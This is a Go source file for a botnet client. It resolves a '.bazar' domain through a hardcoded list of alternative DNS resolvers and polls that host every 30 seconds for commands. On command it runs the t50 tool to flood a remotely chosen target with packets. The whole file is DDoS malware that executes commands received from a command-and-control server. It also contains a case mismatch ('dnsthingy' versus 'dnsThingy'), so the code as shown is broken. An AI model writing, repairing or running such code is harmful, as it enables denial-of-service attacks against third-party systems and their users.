package main

import (
  "net/http"
  "log"
  "fmt"
  "io/ioutil"
  "strings"
  "time"
  "github.com/bogdanovich/dns_resolver"
  "net"
  "os/exec"
)

func main() {
  for {
    idk := strings.Split(time.Now().Format("2006 01 02 3 4 5"), " ")
    if idk[5] == "30"{
      break
    }
  }
  nonceList := []string{}
  for{
    command := strings.Split(httpget("http://" + dnsthingy("example.bazar").String()), " ")
    if command[0] == "0"{
      //null command
      fmt.Println("no command")
    }else if command[0] == "1"{
      //ddos
      if contains(nonceList, command[5]){
        fmt.Println("command repeat")
      }else{
        if command[4] == "rand"{
            s := "timeout " + command[1] + "s ./t50 " + command[3] + " --saddr " + httpget("http://api.ipify.org/") + " --flood --turbo --protocol " + command[2]
            nonceList = append(nonceList, command[5])
            fmt.Println(s)
            linuxThingy(s)
        }else
        {
          s := "timeout " + command[1] + "s ./t50 " + command[3] + " --saddr " + httpget("http://api.ipify.org/") + " --flood --turbo --protocol " + command[2] + " --dport " + command[4]
          nonceList = append(nonceList, command[5])
          fmt.Println(s)
          linuxThingy(s)
        }
      }
    }else if command[0] == "2"{
      fmt.Println("command placeholder")
    }else{
      fmt.Println("invalid command")
    }
    time.Sleep(30 * time.Second)
  }
}

func dnsThingy(domain string) net.IP {
	resolver := dns_resolver.New([]string{"5.132.191.104", "172.105.162.206", "142.4.204.111", "142.4.205.47", "198.100.148.224", "149.56.184.112", "66.70.228.164", "51.254.25.115", "51.89.88.77", "176.9.37.132", "51.38.99.35", "89.163.140.67", "161.35.198.1", "45.9.63.233", "185.84.81.194", "78.47.243.3", "195.10.195.195", "185.120.22.15", "172.104.136.243", "94.247.43.254", "45.71.185.100", "95.217.16.205", "62.210.177.189", "62.210.180.71", "94.23.60.104", "151.80.222.79", "87.98.175.85", "195.154.106.113", "51.75.125.29", "51.255.211.146", "104.238.186.189", "213.181.208.31", "172.105.49.243", "192.71.245.208", "172.105.220.183", "104.244.79.186", "142.4.204.111", "82.196.13.99", "51.15.98.97", "112.109.84.76", "145.239.92.241", "188.213.49.35", "91.217.137.37", "185.52.0.55", "176.126.70.119", "206.189.155.220", "198.98.49.91", "45.79.57.113", "157.245.161.252", "46.21.150.56", "63.231.92.27", "45.79.193.205", "35.211.96.150", "172.98.193.42", "162.248.241.94", "155.130.14.5", "192.34.59.80", "162.243.19.47", "155.138.240.237", "69.164.196.21", "50.116.17.96", "66.18.1.46", "147.135.113.37", "147.135.115.88"})
	resolver.RetryTimes = 10
	ip, err := resolver.LookupHost(domain)
	if err != nil {
		log.Fatal(err.Error())
	}
	return ip[0]
}

func linuxThingy(s string) {
  args := strings.Split(s, " ")
  cmd := exec.Command(args[0], args[1:]...)
  b, err := cmd.CombinedOutput()
  if err != nil {
    log.Println(err)
  }
  fmt.Println(string(b[:]))
}

func httpget(url string) string {
    resp, err := http.Get(url)
    if err != nil {
        panic(err)
    }
    defer resp.Body.Close()
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        panic(err)
    }
    return string(body)
}

func contains(slice []string, item string) bool {
    set := make(map[string]struct{}, len(slice))
    for _, s := range slice {
        set[s] = struct{}{}
    }

    _, ok := set[item]
    return ok
}
